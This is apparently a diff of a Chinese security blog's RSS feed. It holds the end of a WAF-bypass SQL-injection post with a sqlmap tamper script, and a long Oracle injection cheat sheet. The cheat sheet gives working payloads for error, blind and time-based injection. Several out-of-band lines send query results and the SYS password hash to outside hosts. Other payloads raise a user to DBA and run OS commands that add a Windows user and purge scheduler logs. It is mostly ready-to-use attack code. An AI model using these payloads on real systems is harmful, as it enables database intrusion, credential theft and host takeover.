+其中http://192.168.44.132/mysql.php?id=1是我本地的一个测试环境&lt;br /&gt;
+其中下面的绕过都是以fuzz为主，不考虑web容器的特性，尝试绕过联合查询 -1 union select 1，2，3 from dual&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;百度云加速bypass&lt;br /&gt;
+union select    #filter&lt;br /&gt;
+from dual   #not filted&lt;br /&gt;
+select from dual    #filter&lt;br /&gt;
+只需要绕过select即可 使用–+aaaaaa%0a可bypass&lt;br /&gt;
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/3.png&quot; alt=&quot;image&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;360主机卫士bypass &lt;br /&gt;
+发现%23%0aand%230a1=1    可以绕过and 1=1 限制&lt;br /&gt;
+最后在union select from的时候却绕不过去  &lt;br /&gt;
+直接使用大字符串来fuzz %23-FUZZ-%0a https://github.com/minimaxir/big-list-of-naughty-strings/blob/master/blns.txt 发现可以成功绕过waf&lt;br /&gt;
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/4.png&quot; alt=&quot;image&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;云锁&lt;br /&gt;
+union select 如下就可以绕过&lt;br /&gt;
+http://www.yunsuo.com.cn/download.html?id=1%20union/&lt;em&gt;!/&lt;/em&gt;!select%201,2,3*/&lt;br /&gt;
+转换成multiform/data可轻松绕过 
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/7.png&quot; alt=&quot;image&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;安全狗bypass&lt;br /&gt;
+直接搞就行了
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/6.png&quot; alt=&quot;image&quot; /&gt;
+当然也可以chunked提交
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/chunked.png&quot; alt=&quot;image&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;阿里云 &lt;br /&gt;
+尝试使用自定义变量方式来绕过 @a:=(select @b:=&lt;code class=&quot;highlighter-rouge&quot;&gt;table_name&lt;/code&gt;from{a information_schema.&lt;code class=&quot;highlighter-rouge&quot;&gt;TABLES&lt;/code&gt; }limit 0,1)union select ‘1’,@a&lt;br /&gt;
+@p:=(select)被过滤 fuzz下p参数使用@$:=(select)可以绕过&lt;br /&gt;
+union select 1被过滤   使用union%23aa%0a/&lt;em&gt;!select–%01%0a&lt;/em&gt;/1,@$,3 可以绕过 &lt;br /&gt;
+发现重点就是绕过表名 select 1 from dual 一些常规的方法测试无果 随便fuzz下注释/&lt;em&gt;!数字&lt;/em&gt;/却偶然发现有俩个数据包遗漏&lt;br /&gt;
+想起了以前乌云上一哥的的一个漏洞https://wooyun.shuimugan.com/bug/view?bug_no=94367
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/alifuzz1.png&quot; alt=&quot;image&quot; /&gt;
+难道是因为访问频率导致遗漏？随即我又进行了一些fuzz fuzz1w到5w数字型的注释 加大线程 发现遗漏了更多&lt;br /&gt;
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/alifuzz2.png&quot; alt=&quot;image&quot; /&gt;
+我想测试一下之前的waf挑战赛，发现之前提交的payload已经修复了，而且那个漏洞url无法访问了:(  所以无法确认。&lt;br /&gt;
+随即我又进行了一些超长字符串的fuzz 简单fuzz1w-10w 以500为step 发现现象更多了 可初步判断存在遗漏
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/alifuzz4.png&quot; alt=&quot;image&quot; /&gt;
+    &lt;h3 id=&quot;0x3-自动化&quot;&gt;0x3 自动化&lt;/h3&gt;
+    &lt;p&gt;以360主机卫士为例，编写sqlmap tamper脚本。&lt;br /&gt;
+正常无waf sqlmap联合查询如下：&lt;br /&gt;
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/sqlmap.png&quot; alt=&quot;image&quot; /&gt;
+开启主机卫士，放到浏览器调试，修改相关payload使其能正常运行。
+最后tamper脚本如下：&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from lib.core.enums import PRIORITY
+from lib.core.settings import UNICODE_ENCODING
+__priority__ = PRIORITY.LOW
+def dependencies():
+  pass
+def tamper(payload, **kwargs):
+  &quot;&quot;&quot;
+  Replaces keywords
+  &amp;gt;&amp;gt;&amp;gt; tamper('UNION SELECT id FROM users')
+  '1 union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/ NULL,/*!12345CONCAT*/(0x7170706271,IFNULL(/*!12345CASt(*/COUNT(*) AS CHAR),0x20),0x7171786b71),NULL/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x73716c696e6a656374--
+  &quot;&quot;&quot;
+  if payload:
+      payload=payload.replace(&quot;UNION ALL SELECT&quot;,&quot;union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/&quot;)
+      payload=payload.replace(&quot;UNION SELECT&quot;,&quot;union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/&quot;)
+      payload=payload.replace(&quot; FROM &quot;,&quot;/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/&quot;)
+      payload=payload.replace(&quot;CONCAT&quot;,&quot;/*!12345CONCAT*/&quot;)
+      payload=payload.replace(&quot;CAST(&quot;,&quot;/*!12345CAST(*/&quot;)
+      payload=payload.replace(&quot;CASE&quot;,&quot;/*!12345CASE*/&quot;)
+      payload=payload.replace(&quot;DATABASE()&quot;,&quot;database/**/()&quot;)
+                
+  return payload
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;可以成功获取到相关数据。
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/sqlmap2.png&quot; alt=&quot;image&quot; /&gt;
+其他参考链接如下：&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.anquan.us/search?keywords=bypass&amp;amp;content_search_by=by_bugs
+http://drops.xmd5.com/static/drops/tips-7883.html
+https://xianzhi.aliyun.com/forum/attachment/big_size/wafbypass_sql.pdf
+http://drops.xmd5.com/static/drops/papers-4323.html  
+https://www.cnblogs.com/xiaozi/p/6927348.html  
+http://swende.se/blog/HTTPChunked.html#  
+https://xz.aliyun.com/t/1239
+http://www.sqlinjectionwiki.com/categories/2/mysql-sql-injection-cheat-sheet/  
+https://mp.weixin.qq.com/s/S318-e4-eskfRG38HZk_Qw  
+https://joychou.org/web/nginx-Lua-waf-general-bypass-method.html    #nginx lua waf  
+https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF  
+https://websec.ca/kb/sql_injection#MySQL_Comment_Out_Query  
+https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;转载请注明：&lt;a href=&quot;https://notwhy.github.io/&quot;&gt;whynot&lt;/a&gt; » &lt;a href=&quot;https://notwhy.gitbooks.io/2018/06/sql-injection-fuck-waf/&quot;&gt;sql-injection-fuck-waf&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 29 Jun 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/06/sql-injection-fuck-waf/</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/06/sql-injection-fuck-waf/</guid>
+        
+        <category>sql-injection</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>hacking-oracle</title>
+        <description>&lt;p&gt;0x0 前言 
+0x1 信息探测 
+0x2 命令执行 
+0x3 实战&lt;/p&gt;
+&lt;h3 id=&quot;0x0-前言&quot;&gt;0x0 前言&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;  在乙方做渗透测试的时候，经常会遇到oracle数据库的注入，这里是针对oracle数据库进行sql注入一系列总结，其中绝大大多数知识都是跟着各位大哥或者前辈学来，感谢他们的分享。 &lt;br /&gt;
+测试数据库如下：  &lt;br /&gt;
+ORACLE DATABASE 10G ENTERPRISE EDITION RELEASE 10.2.0.1.0 &lt;br /&gt;
+Oracle Database 11g Express Edition Release 11.2.0.2.0.&lt;br /&gt;
+Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit&lt;br /&gt;
+Oracle Database 10g Enterprise Edition Release 10.2.0.3.0  &lt;br /&gt;
+以下所说的10g默认为10.2.0.3.0 11g默认为11.2.0.1.0&lt;/p&gt;
+&lt;h3 id=&quot;0x1-信息探测&quot;&gt;0x1 信息探测&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;SQL&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select user from dual #当前用户
+SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';   #oracle版本
+select wmsys.wm_concat(granted_role) from user_role_privs-- 看赋予角色权限
+select instance_name from v$instance#服务器sid 远程链接需要
+select utl_inaddr.get_host_name('127.0.0.1') from dual; #查询内网hostname win08dc.contoso.com
+SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;  #对外通信
+SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;
+select table_name from user_tables where lower(table_name)='books'   #查看books表书否存在
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Error Based(报错注入)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(10g or 11g)
+' and 1 = ctxsys.drithsx.sn(1,(select user from dual))--  
+and 1=(dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1))) and 1=1. 
+' and 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4113=4113) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(107)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)--  
+' and dbms_xdb_version.checkin((select user from dual))='1'--  
+' and dbms_xdb_version.makeversioned((select user from dual))='1'--  
+' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
+' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
+' and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--     #user第一位是S ORA-01476: divisor is equal to zero 
+' order by (SELECT (CASE WHEN (2434=2434||utl_inaddr.get_host_name((select banner from v$version where rownum=1))) THEN 2434 ELSE CAST(1 AS INT)/0 END) FROM DUAL)--%'  
+
+11g普通用户不能用的#utl_inaddr not work maybe acl(11g normal user) or java not installed etc
+'||utl_inaddr.get_host_address((select banner from v$version where rownum=1))||'    
+'||utl_inaddr.get_host_name((select banner from v$version where rownum=1))||'
+
+10g不能用的
+' and dbms_aw_xml.readawmetadata((select sys_context('USERENV', 'SESSION_USER') from dual), null) is null --    #(11g 10g报错ORA-29532: Java call terminated by uncaught Java exception: java.lang.OutOfMemoryError)
+' or dbMS_aW_xMl.reAdaWmetaData((select sYS_cONtExt('US' || 'ERENV', 'SESS' || 'ION_US' || 'ER') from dUAl), null) is null --# bypass 1
+' and 1=(ordsys.ord_dicom.getmappingxpath((select user from dual),user,user))-- 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Boolean-based blind(boolean型盲注)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;' and  1=(1) and substr(user,0,1)='Z
+' and length(user)=6-- length('a')=1-- length(1111)=4
+name=admin adm'||case when 1=2 then NULL else 1 end||'in(搜索框也可用)
+'||case when length(sys.database_name)=8 then NULL else 1 end||'
+a%' order by (case when 1=2 then name else 'somthing' end)--    #表达式为真根据id排序为假根据something
+排序不同
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Union(联合查询)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;' and 1=2 union select NULL,NULL,NULL--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Time(时间盲注)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; order by (case when(1=1) then dbms_pipe.receive_message('ku', 10) else 1 end)
+ ' and 1 = case when substr(user, 1, 1) = 'S' then dbms_pipe.receive_message('ku', 10) else 1 end --
+ ' and 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(121)||CHR(68)||CHR(74),5)
+ ?id=(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),14) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;stack query(堆叠查询)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;oralce不支持堆叠查询，除非你找到能利用PL/SQL的相关函数。#No stacked queries Cannot add ; do something nasty Unless you get really lucky to be injected into PL/SQL*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Out of Band(OOB)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#both 10 and 11g（window无限制）
+select DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80) from dual 
+SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.fzrsuf.3w1.pw',80) FROM dual     #获取sys密码
+
+#both 10 and 11g（oracle 11g普通用户有限制)
+SELECT UTL_HTTP.REQUEST('http://74.121.151.89') FROM DUAL;  #get the first 2000 bytes of data 
+select utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw') from dual
+
+#all users,8-10g R2
+select httpuritype( 'http://74.121.151.89/123344/back.pl').getclob() from dual; 
+
+#both 10 and 11g（oracle 11g普通用户有限制) 
+(select extractvalue(xmltype('&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % nakut SYSTEM &quot;http://'||(select CHR(51)||CHR(54)||CHR(48) from dual)||'.fzrsuf.3w1.pw/&quot;&amp;gt;%nakut;]&amp;gt;'),'/l') from dual)    
+(select extractvalue(xmltype('&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &quot;http://74.121.151.89:8888/'||(SELECT user from dual)||'&quot;&amp;gt; %remote;]&amp;gt;'),'/l') from dual)
+(select extractvalue(xmltype('&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &quot;http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum&amp;lt;5)||'&quot;&amp;gt; %remote; %param1;]&amp;gt;'),'/l') from dual)    #GET /admin:1,safe:2,test:3 获取前三列 (10g获取报错了)
+
+web下利用
+'||UTL_HTTP.REQUEST('http://74.121.151.89:8888')||'
+'||utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw')||'
+'||DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80))||'
+
+' and utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw')=1--
+' and utl_inaddr.get_host_address((select 3333333 from dual)||'.fzrsuf.3w1.pw') like 1--
+' and UTL_HTTP.REQUEST('http://74.121.151.89:8888')='1'--
+' and DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80) is not null--    #后面要加is not null
+
+' and (select extractvalue(xmltype('&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &quot;http://74.121.151.89:8888/'||(SELECT user from dual)||'&quot;&amp;gt; %remote;]&amp;gt;'),'/l') from dual)||'
+' and 1=(select extractvalue(xmltype('&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &quot;http://74.121.151.89:8888/'||(SELECT user from dual)||'&quot;&amp;gt; %remote;]&amp;gt;'),'/l') from dual) or '1'='1
+' AND 1=(select extractvalue(xmltype('&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &quot;http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum&amp;lt;5)||'&quot;&amp;gt; %remote; %param1;]&amp;gt;'),'/l') from dual)--    #可能会报错 但还是会执行 尽量用一些53 80的端口
+' AND 1=(select extractvalue(xmltype('&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &quot;http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum&amp;lt;5)||'&quot;&amp;gt; %remote; %param1;]&amp;gt;'),'/l') from dual)--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;手工注入&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#查询框注入示例(Boolean)
+name=a%' and (select count(*) from users)&amp;lt;&amp;gt;0 and '%'='   #不等于为&amp;lt;&amp;gt; 返回一样证明users表存在
+name=a%' and (select count(*) from users)&amp;lt;&amp;gt;3 and '%'='  #返回不一样证明users表行数为3
+select count(id) from users   #证明id字段存在
+select count(name) from users   #证明name字段存在
+name=a%' and  (select length(name) from users where id=1)&amp;lt;&amp;gt;5 and '%'='  #返回不一致证明id为1的列name数据长度为5 去掉id=1信息跑其中第一个name长度为5的数据
+name=a%' and  ((select count(*) from users where id=1 and ascii(substr(name,1,1))=97))&amp;lt;&amp;gt;0 and '%'='   #有返回证明第一位字符为a
+name=a%' and  ((select count(*) from users where id=1 and ascii(substr(name,2,1))=100))&amp;lt;&amp;gt;0 and '%'='  #第二位字符为d
+name=a%' and  (select count(*) from users where ascii(substr(name,1.1))&amp;gt;=97)=1 and '%'='    #只有一个用户
+name=a%' and  (select count(*) from users where length(name)=4 and ascii(substr(name,1,1))=115 and ascii(substr(name,2,1))=97)&amp;lt;&amp;gt;0 and '%'='  #不加id如果数据多略微麻烦一点    #多用户跑name为safe 前俩位 不多详解
+
+#报错注入(Error Based)
+select * from user_tab_columns where column_name like '%name%'    #user_table_columns=user_tab_cols
+table_name  column_name data_type
+users   name    VARCHAR2
+test    name    VARCHAR2
+select count(*) from user_tab_columns where column_name like '%name%'   #查询字段中有password到表名 返回行数
+select chr(35)||data||chr(39) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns where column_name like '%name%') where limit =2    #查看第二条含有列名%name%的表明列名
+name=a%' and  1=(utl_inaddr.get_host_address(((select chr(35)||data||chr(39) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns where column_name like '%name%') where limit =2)))) and '%'='  #通过报错提取第二行数据
+Warning: oci_execute(): ORA-29257: host #users##name' unknown ORA-06512:  #表明users 列名name
+select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =1    #获取该表第一个列名 CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115))为users编码所得
+name=a%' and  1=(utl_inaddr.get_host_address(((select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =1))))  and '%'='
+Warning: oci_execute(): ORA-29257: host ~'id'~ 
+name=a%' and  1=(utl_inaddr.get_host_address(((select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =2))))  and '%'='
+Warning: oci_execute(): ORA-29257: host ~'name'~ 
+name=a%' and  1=(utl_inaddr.get_host_address((Select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,id||chr(35)||NAME as data from users) where limit=1)))  and '%'='
+Warning: oci_execute(): ORA-29257: host ~'1#admin'~ unknown
+
+'||utl_inaddr.get_host_name((SELECT table_name FROM USER_TAB_COLS WHERE COLUMN_NAME LIKE '%25%32%35F_YHKL%25%32%35' and table_name not like '%25%32%35%25%34%32%25%34%39%25%34%65%25%32%35' and table_name not in ('TBZYDA') and table_name not in('TBCZJZYDA') AND ROWNUM=1))||'   #oracle(还是jsp 忘了)好像可以对url编码自动解码 测试超过三次失败
+
+#批量提取
+'||utl_inaddr.get_host_address((select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum&amp;lt;5))||' #listagg 11g以上提取数据
+select wmsys.wm_concat(id||chr(58)||name) from user     #通用
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;调试信息(本文用到的)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from user_java_policy where grantee_name='SYSTEM'; 查看SYSTEM可用的java权限列表，通过以下命令查看赋权情况 #ORACLE不要用双引号 双引号会被当成字符处理 所以一般用成对的引号 '' '''' ''''''''
+select * from user_objects where OBJECT_NAME='javaexec' #检测包是否创建成功
+select * from user_objects where OBJECT_NAME='JAVACMD'  #检测函数是否存在 函数要么与原先一致要么大写 
+select wmsys.wm_concat(granted_role) from user_role_privs-- 看赋予角色权限
+select text from all_source where name = 'DBMS_EXPORT_EXTENSION' 查询包的源码
+SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') order by object_id desc; 查询已安装的函数
+删除对应的某个权限 如去除java.io.FilePermission
+begin
+  DBMS_JAVA.DISABLE_PERMISSION(129);
+  dbms_java.delete_permission(129); 
+  commit;
+end;
+删除相关的包类或者函数  #Use the DROP JAVA statement to drop a Java source, class, or resource schema object.
+revoke JAVASYSPRIV from SYSTEM;
+drop JAVA SOURCE &quot;javaexec&quot;;
+drop FUNCTION SYSTEM.javacmd;
+drop FUNCTION SYSTEM.myjava;
+drop FUNCTION SYSTEM.myjava1;
+drop FUNCTION SYSTEM.myjava2;
+list all Java related stored objects class
+SELECT object_name,object_type,status,timestamp FROM user_objects WHERE (object_name NOT LIKE 'SYS_%' AND object_name NOT LIKE 'CREATE$%' AND object_name NOT LIKE 'JAVA$%' AND object_name NOT LIKE 'LOADLOB%') AND object_type LIKE 'JAVA %' ORDER BY object_type, object_name;
+'1'=utl_inaddr.get_host_name((select count(*) from user_objects where OBJECT_NAME='SasugaOracle'))--    #使用web调试
+sqlplus /nolog  #登陆本机
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;0x2-命令执行&quot;&gt;0x2 命令执行&lt;/h3&gt;
+&lt;p&gt;能提dba就提dba 然后grant javasyspriv权限 创建class 创建javacmd 执行命令不能提dba dbms_xmlquery.newcontext赋予其fileio执行权限(10g额外需要write read)&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;提权到dba的几个函数（我就GET_DOMAIN_INDEX_TABLES成功过）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#创建提权函数
+and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace function pwn return varchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate ''''grant dba to TEST'''';commit;return ''''z'''';END; ''; commit; end;') from dual) is not null --
+
+使用SYS.LT.CREATEWORKSPACE提权 9iR2, 10gR1, 10gR2 and 11gR1     #fixed 2009.7
+and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''
+begin SYS.LT.CREATEWORKSPACE(''''A10'''''''' and TEST.pwn()=''''''''x'''');SYS.LT.REMOVEWORKSPA CE(''''A10'''''''' and TEST.pwn()=''''''''x'''');end;''; commit; end;') from dual) is not null --#本地失败
+
+使用sys.dbms_cdc_publish.create_change_set提权 10gR1, 10gR2, 11g R1 and 11gR2   #fixed 2010.10
+select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set('''' a'''',''''a'''',''''a''''''''||TEST.pwn()||''''''''a'''',''''Y'''',s ysdate,sysdate);end;''; commit; end;') from dual--#本地失败
+
+使用GET_DOMAIN_INDEX_TABLES Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT&quot;.PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''grant dba to TEST''''; END;''; END;--', '', 0, '1', 0) from dual)=0--#注 10.2.0.1测试成功
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;11g dba权限下直接执行命令    #测试数据库&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PL/SQL如下:
+begin
+DBMS_SCHEDULER.create_program('myprog11','EXECUTABLE','net user pwned pwn3d!! /add',0,TRUE);
+DBMS_SCHEDULER.create_job(job_name=&amp;gt;'myjob11',program_name=&amp;gt;'myprog11',
+start_date=&amp;gt;NULL,repeat_interval=&amp;gt;NULL,end_date=&amp;gt;NULL,enabled=&amp;gt;TRUE,auto_drop=&amp;gt;TRUE);
+dbms_lock.sleep(1);
+dbms_scheduler.drop_program(program_name=&amp;gt;'myprog11');
+dbms_scheduler.purge_log;
+end;
+#sql injection如下：
+' and (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''myprog10'',''EXECUTABLE'',''net user pwnedfromweb pwn3d!! /add'',0,TRUE);DBMS_SCHEDULER.create_job(job_name=&amp;gt;''myjob10'',program_name=&amp;gt;''myprog10'',start_date=&amp;gt;NULL,repeat_interval=&amp;gt;NULL,end_date=&amp;gt;NULL,enabled=&amp;gt;TRUE,auto_drop=&amp;gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&amp;gt;''myprog10'');dbms_scheduler.purge_log;')from dual) is not null --
+Oracle Database 11g Express Edition Release 11.2.0.2.0 – Production #测试失败
+Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production    #测试失败
+
+参考文章
+https://www.notsosecure.com/hacking-oracle-xe-from-web/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;dba下赋予相关权限&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#only be executed by SYS.Affected Systems:8,9,10g R1,R2,11gR1
+(Select DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname); execute immediate ''declare pragma autonomous_transaction;begin execute immediate ''''grant dba to aaaa'''';end;''; end;--','CCCC') from dual) is not null-- 
